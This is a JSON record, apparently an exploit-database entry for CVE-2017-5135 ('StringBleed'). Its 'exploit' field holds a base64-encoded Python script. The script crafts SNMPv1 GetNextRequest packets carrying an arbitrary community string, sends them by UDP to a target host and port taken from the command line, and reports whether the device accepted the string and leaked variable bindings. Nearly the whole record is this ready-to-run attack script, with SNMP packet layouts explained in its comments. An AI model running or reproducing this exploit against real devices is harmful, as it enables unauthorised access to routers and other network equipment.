{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9weXRob24NCiMgLSotIGNvZGluZzogdXRmLTggLSotDQoNCiMgU3RyaW5nQmxlZWQgLSBDVkUtMjAxNy01MTM1DQoNCl9fYXV0aG9yX18gPSBbIk5peGF3ayJdDQoNCl9fZnVuY3NfXyA9IFsNCiAgICAnZ2VuZXJhdGVfc25tcF9jb21tdW5pdHlzdHInLA0KICAgICdnZW5lcmF0ZV9zbm1wX3Byb3RvX3BheWxvYWQnLA0KICAgICdzZW5kX3NubXBfcmVxdWVzdCcsDQogICAgJ3JlYWRfc25tcF9jb21tdW5pdHlzdHInLA0KICAgICdyZWFkX3NubXBfdmFyYmluZHN0cicsDQogICAgJ3NubXBfbG9naW4nLA0KICAgICdzbm1wX3N0cmluZ2JsZWVkJw0KXQ0KDQoNCmltcG9ydCBzdHJ1Y3QNCmltcG9ydCB1dWlkDQppbXBvcnQgc29ja2V0DQppbXBvcnQgdGltZQ0KaW1wb3J0IGxvZ2dpbmcNCmltcG9ydCBjb250ZXh0bGliDQoNCg0KbG9nZ2luZy5iYXNpY0NvbmZpZyhsZXZlbD1sb2dnaW5nLklORk8pDQpsb2cgPSBsb2dnaW5nLmdldExvZ2dlcihfX2ZpbGVfXykNCg0KDQpkZWYgZ2VuZXJhdGVfc25tcF9jb21tdW5pdHlzdHIoKToNCiAgICByZXR1cm4gc3RyKHV1aWQudXVpZDQoKSkNCg0KDQpkZWYgZ2VuZXJhdGVfc25tcF9wcm90b19wYXlsb2FkKGNvbW11bml0eSk6DQogICAgIiIiR2VuZXJhdGUgc25tcCByZXF1ZXN0IHdpdGggW1NOTVB2MV0gYW5kIFtPSUQ6IDEuMy42LjEuMi4xLjEuMS4wXQ0KICAgIEZvciBleGFtcGxlLCBzdXBwb3NlIG9uZSB3YW50ZWQgdG8gaWRlbnRpZnkgYW4gaW5zdGFuY2Ugb2YgdGhlDQogICAgdmFyaWFibGUgc3lzRGVzY3IgVGhlIG9iamVjdCBjbGFzcyBmb3Igc3lzRGVzY3IgaXM6DQogICAgICAgICBpc28gb3JnIGRvZCBpbnRlcm5ldCBtZ210IG1pYiBzeXN0ZW0gc3lzRGVzY3INCiAgICAgICAgICAxICAgMyAgIDYgICAgIDEgICAgICAyICAgIDEgICAgMSAgICAgICAxDQogICAgIiIiDQoNCiAgICAjIFNOTVB2MSBzcGVjaWZpZXMgZml2ZSBjb3JlIHByb3RvY29sIGRhdGEgdW5pdHMgKFBEVXMpLg0KICAgICMgQWxsIFNOTVAgUERVcyBhcmUgY29uc3RydWN0ZWQgYXMgZm9sbG93czoNCg0KICAgICMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogICAgIyB8IElQIGhlYWRlciAgICAgICAgIHwNCiAgICAjIC0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgICMgfCBVRFAgaGVhZGVyICAgICAgICB8DQogICAgIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0gLS0tLS0tLXwNCiAgICAjIHwgdmVyc2lvbiAgICAgICAgICAgfCAgICAgICAgfA0KICAgICMgfCBjb21tdW5pdHkgICAgICAgICB8ICAgICAgICB8DQogICAgIyB8IFBEVS10eXBlICAgICAgICAgIHwgICAgICAgIHwNCiAgICAjIHwgcmVxdWVzdC1pZCAgICAgICAgfCAgICAgICAgfC0tLS0gU05NUA0KICAgICMgfCBlcnJvci1zdGF0dXMgICAgICB8ICAgICAgICB8DQogICAgIyB8IGVycm9yLWluZGV4ICAgICAgIHwgICAgICAgIHwNCiAgICAjIHwgdmFyaWFibGUgYmluZGluZ3MgfCAgICAgICAgfA0KICAgICMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tIC0tLS0tLS18DQogICAgIw0KDQogICAgIyBUaGUgc2V2ZW4gU05NUCBwcm90b2NvbCBkYXRhIHVuaXQgKFBEVSkgdHlwZXMgYXJlIGFzIGZvbGxvd3M6DQogICAgIyBHZXRSZXF1ZXN0DQogICAgIyBTZXRSZXF1ZXN0DQogICAgIyBHZXROZXh0UmVxdWVzdA0KICAgICMgR2V0QnVsa1JlcXVlc3QNCiAgICAjIFJlc3BvbnNlDQogICAgIyBUcmFwDQogICAgIyBJbmZvcm1SZXF1ZXN0DQoNCiAgICAjIFNOTVB2MSBNZXNzYWdlIEhlYWRlcg0KICAgICMgU05NUHYxIFRyYXAgTWVzc2FnZSBIYW5kZXINCg0KICAgICMgaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzE1OTINCiAgICAjICstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgVGFibGUgMSAoUGFnZSAxIG9mIDIpLiBTTk1QIEdFVCBQRFUgZm9yIGRwaVBvcnRGb3JUQ1AuMCAgICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgT0ZGU0VUICAgICAgICB8IFZBTFVFICAgICAgICAgIHwgRklFTEQgICAgICAgICAgICAgICAgICAgICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgMCAgICAgICAgICAgICB8IDB4MzAgICAgICAgICAgIHwgQVNOLjEgaGVhZGVyICAgICAgICAgICAgICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgMSAgICAgICAgICAgICB8IDM3ICsgbGVuICAgICAgIHwgUERVX2xlbmd0aCwgc2VlIGZvcm11bGEgYmVsb3cgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgMiAgICAgICAgICAgICB8IDB4MDIgMHgwMSAweDAwIHwgU05NUCB2ZXJzaW9uOiAgICAgICAgICAgICAgICAgIHwNCiAgICAjIHwgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICAgIHwgKGludGVnZXIsbGVuZ3RoPTEsdmFsdWU9MCkgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgNSAgICAgICAgICAgICB8IDB4MDQgICAgICAgICAgIHwgY29tbXVuaXR5IG5hbWUgKHN0cmluZykgICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgNiAgICAgICAgICAgICB8IGxlbiAgICAgICAgICAgIHwgbGVuZ3RoIG9mIGNvbW11bml0eSBuYW1lICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgNyAgICAgICAgICAgICB8IGNvbW11bml0eSBuYW1lIHwgdmFyaWVzICAgICAgICAgICAgICAgICAgICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgNyArIGxlbiAgICAgICB8IDB4YTAgMHgxYyAgICAgIHwgU05NUCBHRVQgcmVxdWVzdDogICAgICAgICAgICAgIHwNCiAgICAjIHwgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICAgIHwgcmVxdWVzdF90eXBlPTB4YTAsbGVuZ3RoPTB4MWMgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgNyArIGxlbiArIDIgICB8IDB4MDIgMHgwMSAweDAxIHwgU05NUCByZXF1ZXN0IElEOiAgICAgICAgICAgICAgIHwNCiAgICAjIHwgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICAgIHwgaW50ZWdlcixsZW5ndGg9MSxJRD0xICAgICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgNyArIGxlbiArIDUgICB8IDB4MDIgMHgwMSAweDAwIHwgU05NUCBlcnJvciBzdGF0dXM6ICAgICAgICAgICAgIHwNCiAgICAjIHwgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICAgIHwgaW50ZWdlcixsZW5ndGg9MSxlcnJvcj0wICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgNyArIGxlbiArIDggICB8IDB4MDIgMHgwMSAweDAwIHwgU05NUCBpbmRleDogICAgICAgICAgICAgICAgICAgIHwNCiAgICAjIHwgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICAgIHwgaW50ZWdlcixsZW5ndGg9MSxpbmRleD0wICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgNyArIGxlbiArIDExICB8IDB4MzAgMHgxMSAgICAgIHwgdmFyQmluZCBsaXN0LCBsZW5ndGg9MHgxMSAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgNyArIGxlbiArIDEzICB8IDB4MzAgMHgwZiAgICAgIHwgdmFyQmluZCwgbGVuZ3RoPTB4MGYgICAgICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgNyArIGxlbiArIDE1ICB8IDB4MDYgMHgwYiAgICAgIHwgT2JqZWN0IElELCBsZW5ndGg9MHgwYiAgICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgNyArIGxlbiArIDE3ICB8IDB4MmIgMHgwNiAweDAxIHwgT2JqZWN0LUlEOiAgICAgICAgICAgICAgICAgICAgIHwNCiAgICAjIHwgICAgICAgICAgICAgICB8IDB4MDQgMHgwMSAweDAyIHwgMS4zLjYuMS40LjEuMi4yLjEuMS4xICAgICAgICAgIHwNCiAgICAjIHwgICAgICAgICAgICAgICB8IDB4MDIgMHgwMSAweDAxIHwgT2JqZWN0LWluc3RhbmNlOiAwICAgICAgICAgICAgIHwNCiAgICAjIHwgICAgICAgICAgICAgICB8IDB4MDEgMHgwMCAgICAgIHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgNyArIGxlbiArIDI4ICB8IDB4MDUgMHgwMCAgICAgIHwgbnVsbCB2YWx1ZSwgbGVuZ3RoPTAgICAgICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICAjIHwgTk9URTogIEZvcm11bGEgdG8gY2FsY3VsYXRlICJQRFVfbGVuZ3RoIjogICAgICAgICAgICAgICAgICAgICAgIHwNCiAgICAjIHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwNCiAgICAjIHwgICBQRFVfbGVuZ3RoID0gIGxlbmd0aCBvZiB2ZXJzaW9uIGZpZWxkIGFuZCBzdHJpbmcgdGFnICg0IGJ5dGVzKXwNCiAgICAjIHwgICAgICAgICAgICAgICsgIGxlbmd0aCBvZiBjb21tdW5pdHkgbGVuZ3RoIGZpZWxkICgxIGJ5dGUpICAgICAgIHwNCiAgICAjIHwgICAgICAgICAgICAgICsgIGxlbmd0aCBvZiBjb21tdW5pdHkgbmFtZSAoZGVwZW5kcy4uLikgICAgICAgICAgIHwNCiAgICAjIHwgICAgICAgICAgICAgICsgIGxlbmd0aCBvZiBTTk1QIEdFVCByZXF1ZXN0ICgzMiBieXRlcykgICAgICAgICAgIHwNCiAgICAjIHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwNCiAgICAjIHwgICAgICAgICAgICAgID0gIDM3ICsgbGVuZ3RoIG9mIGNvbW11bml0eSBuYW1lICAgICAgICAgICAgICAgICAgIHwNCiAgICAjICstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCg0KICAgIHNubXBfR2V0TmV4dFJlcXVlc3QgPSBbDQogICAgICAgIGIiMCIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIEFTTi4xIEhlYWRlcg0KICAgICAgICBiIikiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBQRFUgbGVuZ3RoDQogICAgICAgIGIiAgEAIiwgICAgICAgICAgICAgICAgICAgICAjIFNOTVAgVmVyc2lvbg0KICAgICAgICBiIgQiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDb21tdW5pdHkgTmFtZSAoc3RyaW5nKQ0KICAgICAgICBjaHIobGVuKGNvbW11bml0eSkpLCAgICAgICAgICAgICAgICAgIyBDb21tdW5pdHkgTGVuZ3RoDQogICAgICAgIGNvbW11bml0eSwgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENvbW11bml0eSBTdHJpbmcNCiAgICAgICAgYiKhGSIsICAgICAgICAgICAgICAgICAgICAgICAgICMgUERVIFR5cGUgLSBHZXROZXh0UmVxdWVzdA0KICAgICAgICBiIgIEIiwNCiAgICAgICAgc3RydWN0LnBhY2soIjxpIiwgaW50KHRpbWUudGltZSgpKSksICMgUmVxdWVzdCBJRA0KICAgICAgICBiIgIBACIsICAgICAgICAgICAgICAgICAgICAgIyBFcnJvciBTdGF0dXMgKFR5cGUpDQogICAgICAgIGIiAgEAIiwgICAgICAgICAgICAgICAgICAgICAjIEVycm9yIEluZGV4DQogICAgICAgIGIiMCIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFZhcmlhYmxlIFR5cGUgKFNlcXVlbmNlKQ0KICAgICAgICBiIgsiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBMZW5ndGgNCiAgICAgICAgYiIwIiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgVmFyaWFibGUgVHlwZSAoU2VxdWVuY2UpDQogICAgICAgIGIiCSIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIExlbmd0aA0KICAgICAgICBiIgYiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBWYXJpYWJsZSBUeXBlIChPSUQpDQogICAgICAgIGIiBSIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIExlbmd0aA0KICAgICAgICBiIisGAQIBIiwgICAgICAgICAgICAgIyBWYWx1ZQ0KICAgICAgICBiIgUAIiAgIyBOVUxMDQogICAgXQ0KDQogICAgcGt0ID0gIiIuam9pbihzbm1wX0dldE5leHRSZXF1ZXN0KQ0KICAgIGNvbV9sZW5ndGggPSBjaHIobGVuKGNvbW11bml0eSkpDQogICAgcGR1X2xlbmd0aCA9IGNocihsZW4ocGt0KSAtIDIpICAgICAgIyBjb21tdW5pdHkgbGVuZ3RoIGNvc3QgMSBieXRlcyAoZGVmYXVsdCkNCg0KICAgIGlmIGNvbV9sZW5ndGggPiAnfyc6DQogICAgICAgIGNvbV9sZW5ndGggPSAngScgKyBjb21fbGVuZ3RoDQogICAgICAgIHBkdV9sZW5ndGggPSBjaHIobGVuKHBrdCkgLSAxKSAgIyBjb21tdW5pdHkgbGVuZ3RoIGNvc3QgMiBieXRlcw0KDQogICAgaWYgcGR1X2xlbmd0aCA+ICd/JzoNCiAgICAgICAgcGR1X2xlbmd0aCA9ICeBJyArIHBkdV9sZW5ndGgNCg0KICAgIHNubXBfR2V0TmV4dFJlcXVlc3RbMV0gPSBwZHVfbGVuZ3RoDQogICAgc25tcF9HZXROZXh0UmVxdWVzdFs0XSA9IGNvbV9sZW5ndGgNCg0KICAgIHBrdCA9IGIiIi5qb2luKHNubXBfR2V0TmV4dFJlcXVlc3QpDQoNCiAgICByZXR1cm4gcGt0DQoNCg0KZGVmIHNlbmRfc25tcF9yZXF1ZXN0KGhvc3QsIHBvcnQsIGNvbW11bml0eSwgdGltZW91dD02LjApOg0KICAgICIiIlNlbmQgc25tcCByZXF1ZXN0IGJhc2VkIG9uIFVEUC4NCiAgICAiIiINCiAgICBkYXRhID0gJycNCg0KICAgIHRyeToNCiAgICAgICAgd2l0aCBjb250ZXh0bGliLmNsb3Npbmcoc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pKSBhcyBjbGllbnQ6DQogICAgICAgICAgICBzbm1wX3JhdyA9IGdlbmVyYXRlX3NubXBfcHJvdG9fcGF5bG9hZChjb21tdW5pdHkpDQogICAgICAgICAgICBjbGllbnQuc2V0dGltZW91dCh0aW1lb3V0KQ0KICAgICAgICAgICAgY2xpZW50LnNlbmR0byhzbm1wX3JhdywgKGhvc3QsIHBvcnQpKQ0KICAgICAgICAgICAgZGF0YSwgXyA9IGNsaWVudC5yZWN2ZnJvbSgyMDE0KQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXJyOg0KICAgICAgICBsb2cuZXJyb3IoInt9IDoge30gLSB7fSIuZm9ybWF0KGhvc3QsIHBvcnQsIGVycikpDQoNCiAgICByZXR1cm4gZGF0YQ0KDQoNCmRlZiByZWFkX3NubXBfY29tbXVuaXR5c3RyKHNubXBfcmVzcG9uc2UpOg0KICAgICIiIlBhcnNlIHNubXAgcmVzcG9uc2UgYmFzZWQgb24gUkZDLTExNTcgKGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmMxMTU3KQ0KICAgICIiIg0KICAgIGNvbW11bml0eV9zdHIgPSAnJw0KDQogICAgaWYgbm90IHNubXBfcmVzcG9uc2U6DQogICAgICAgIHJldHVybiBjb21tdW5pdHlfc3RyDQoNCiAgICBwZHVfbGVuZ3RoID0gc25tcF9yZXNwb25zZVsxXSAgIyAiMCYCASIsICIwgeoCASINCiAgICBpZiBvcmQocGR1X2xlbmd0aCkgPiAweDdmOg0KICAgICAgICBvZmZzZXQgPSA4ICAjICIwgeoCAQAEJCINCiAgICBlbHNlOg0KICAgICAgICBvZmZzZXQgPSA3ICAjICIwJgIBAAQGIg0KDQogICAgY29tbXVuaXR5X2xlbmd0aCA9IHNubXBfcmVzcG9uc2Vbb2Zmc2V0IC0gMV0NCiAgICBjb21tdW5pdHlfc3RyID0gc25tcF9yZXNwb25zZVtvZmZzZXQ6IG9mZnNldCArb3JkKGNvbW11bml0eV9sZW5ndGgpXQ0KDQogICAgcmV0dXJuIGNvbW11bml0eV9zdHINCg0KDQpkZWYgcmVhZF9zbm1wX3ZhcmJpbmRzdHIoc25tcF9yZXNwb25zZSk6DQogICAgIiIiUGFyc2Ugc25tcCByZXNwb25zZSBiYXNlZCBvbiBSRkMtMTE1NyAoaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzExNTcpDQogICAgIiIiDQogICAgdmFyaWFibGVfYmluZGluZ19zdHJpbmcgPSAnJw0KDQogICAgaWYgbm90IHNubXBfcmVzcG9uc2U6DQogICAgICAgIHJldHVybiB2YXJpYWJsZV9iaW5kaW5nX3N0cmluZw0KDQogICAgcGR1X2xlbmd0aCA9IHNubXBfcmVzcG9uc2VbMV0gICMgIjAmAgEiLCAiMIHqAgEiDQogICAgaWYgb3JkKHBkdV9sZW5ndGgpID4gMHg3ZjoNCiAgICAgICAgb2Zmc2V0ID0gOCAgIyAiMIHqAgEABCQiDQogICAgZWxzZToNCiAgICAgICAgb2Zmc2V0ID0gNyAgIyAiMCYCAQAEBiINCg0KICAgIGNvbW11bml0eV9sZW5ndGggPSBzbm1wX3Jlc3BvbnNlW29mZnNldCAtIDFdDQogICAgcGR1X2RhdGFfb2Zmc2V0ID0gb2Zmc2V0ICsgb3JkKGNvbW11bml0eV9sZW5ndGgpDQogICAgcGR1X2RhdGEgPSBzbm1wX3Jlc3BvbnNlW3BkdV9kYXRhX29mZnNldDpdICAjIDggPSBmaXJzdCBzbm1wIDggYnl0ZXMNCg0KICAgIGxhc3RfcGR1ID0gcGR1X2RhdGEuc3BsaXQoIgAiKVstMV0NCg0KICAgICMgaWYgZGF0YSA+IDEyNyAoMHg3ZiksIHZhcmlhYmxlLWJpbmRpbmdzIGxlbmd0aDogMyBieXRlcw0KICAgICMgaWYgZGF0YSA8IDEyNyAoMHg3ZiksIHZhcmlhYmxlLWJpbmRpbmdzIGxlbmd0aDogMiBieXRlcw0KDQogICAgbGFzdF9wZHVfbGVuZ3RoID0gb3JkKGxhc3RfcGR1WzFdKQ0KICAgIGlmIGxhc3RfcGR1X2xlbmd0aCA+IDB4N2Y6DQogICAgICAgIHZhcmlhYmxlX2JpbmRpbmdfc3RyaW5nID0gIGxhc3RfcGR1WzM6XQ0KICAgIGVsc2U6DQogICAgICAgIHZhcmlhYmxlX2JpbmRpbmdfc3RyaW5nID0gbGFzdF9wZHVbMjpdDQogICAgcmV0dXJuIHZhcmlhYmxlX2JpbmRpbmdfc3RyaW5nDQoNCg0KZGVmIHNubXBfbG9naW4oaG9zdCwgcG9ydCwgY29tbXVuaXR5KToNCiAgICAiIiJsb2dpbiBzbm1wIHNlcnZpY2Ugd2l0aCBTTk1QdjEgY29tbXVuaXR5IHN0cmluZy4NCiAgICAiIiINCiAgICBsb2dpbl9zdGF0dXMgPSBGYWxzZQ0KICAgIHRyeToNCiAgICAgICAgcmVzcF9jb21tdW5pdHkgPSByZWFkX3NubXBfY29tbXVuaXR5c3RyKA0KICAgICAgICAgICAgc2VuZF9zbm1wX3JlcXVlc3QoaG9zdCwgaW50KHBvcnQpLCBjb21tdW5pdHkpDQogICAgICAgICkNCg0KICAgICAgICBpZiAocmVzcF9jb21tdW5pdHkgPT0gY29tbXVuaXR5KToNCiAgICAgICAgICAgIGxvZ2luX3N0YXR1cyA9IFRydWUNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGVycjoNCiAgICAgICAgbG9nLmVycm9yKGVycikNCg0KICAgIHJldHVybiBsb2dpbl9zdGF0dXMNCg0KDQpkZWYgc25tcF9zdHJpbmdibGVlZChob3N0LCBwb3J0LCBjb21tdW5pdHkpOg0KICAgICIiIlRlc3QgYWdhaW5zdHMgU25tcCBTdHJpbmdCbGVlZCBDVkUtMjAxNy01MTM1Lg0KICAgICIiIg0KICAgIHN0cmluZ2JsZWVkX3N0YXR1cyA9IEZhbHNlDQogICAgdHJ5Og0KICAgICAgICByZXNwX3ZhcmJpbmRzdHIgPSByZWFkX3NubXBfdmFyYmluZHN0cigNCiAgICAgICAgICAgICAgICBzZW5kX3NubXBfcmVxdWVzdChob3N0LCBpbnQocG9ydCksIGNvbW11bml0eSkNCiAgICAgICAgICAgICkNCiAgICAgICAgaWYgcmVzcF92YXJiaW5kc3RyOiBzdHJpbmdibGVlZF9zdGF0dXMgPSBUcnVlDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlcnI6DQogICAgICAgIGxvZy5lcnJvcihlcnIpDQoNCiAgICByZXR1cm4gc3RyaW5nYmxlZWRfc3RhdHVzDQoNCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBpbXBvcnQgc3lzDQoNCiAgICBpZiBsZW4oc3lzLmFyZ3YpICE9IDQ6DQogICAgICAgIGxvZy5pbmZvKCJVc2FnZSBweXRob24ge30gPHNubXAtaG9zdD4gPHNubXAtcG9ydD4gPHNubXAtY29tbXVuaXR5LXN0cj4iLmZvcm1hdChzeXMuYXJndlswXSkpDQogICAgICAgIHN5cy5leGl0KDEpDQoNCiAgICBob3N0ID0gc3lzLmFyZ3ZbMV0NCiAgICBwb3J0ID0gc3lzLmFyZ3ZbMl0NCiAgICBjb21tdW5pdHkgPSBzeXMuYXJndlszXQ0KDQogICAgaWYgc25tcF9sb2dpbihob3N0LCBpbnQocG9ydCksIGNvbW11bml0eSk6DQogICAgICAgIGxvZy5pbmZvKCJ7fTp7fSAtIFt7fV0gc25tcCBsb2dpbiBzdWNjZXNzZnVsbHkuIi5mb3JtYXQoaG9zdCwgcG9ydCwgY29tbXVuaXR5KSkNCiAgICBlbHNlOg0KICAgICAgICBsb2cuaW5mbygie306e30gLSBbe31dIHNubXAgbG9naW4gZmFpbGVkLiIuZm9ybWF0KGhvc3QsIHBvcnQsIGNvbW11bml0eSkpDQoNCiAgICBpZiBzbm1wX3N0cmluZ2JsZWVkKGhvc3QsIGludChwb3J0KSwgY29tbXVuaXR5KToNCiAgICAgICAgbG9nLmluZm8oInt9Ont9IC0gW3t9XSBzbm1wIFN0cmluZ0JsZWVkIHN1Y2Nlc3NmdWxseS4iLmZvcm1hdChob3N0LCBwb3J0LCBjb21tdW5pdHkpKQ0KICAgIGVsc2U6DQogICAgICAgIGxvZy5pbmZvKCJ7fTp7fSAtIFt7fV0gc25tcCBTdHJpbmdCbGVlZCBmYWlsZWQuIi5mb3JtYXQoaG9zdCwgcG9ydCwgY29tbXVuaXR5KSkNCg0KDQojIyBSZWZlcmVuY2VzDQojIGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmMxMTU3DQojIGh0dHA6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjI5OTgyMTIvZGVjb2RlLXNubXAtcGR1cy13aGVyZS10by1zdGFydA0KIyBodHRwOi8vd3d3Lm5ldC1zbm1wLm9yZy8NCiMgaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvU2ltcGxlX05ldHdvcmtfTWFuYWdlbWVudF9Qcm90b2NvbA0KIyBodHRwczovL3dpa2kud2lyZXNoYXJrLm9yZy9TTk1QDQojIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9kZXNrdG9wL2JiNjQ4NjQzKHY9dnMuODUpLmFzcHgNCiMgaHR0cDovL2NzLnVjY3MuZWR1L35jczUyMi9zdHVkZW50cHJvai9wcm9qRjIwMDQvanJyZWVzZS9kb2MvU05NUC5kb2MNCiMgaHR0cHM6Ly9naXRodWIuY29tL2V4aHVtYS9wdXJlc25tcC9ibG9iL2JlMTI2N2JiNzkyYmUwYTViZGY1N2IwNzQ4MzU0ZDJkM2M3ZjlmYjAvcHVyZXNubXAvcGR1LnB5", 
    "id": "43384", 
    "cves": [
        "CVE-2017-5135"
    ]
}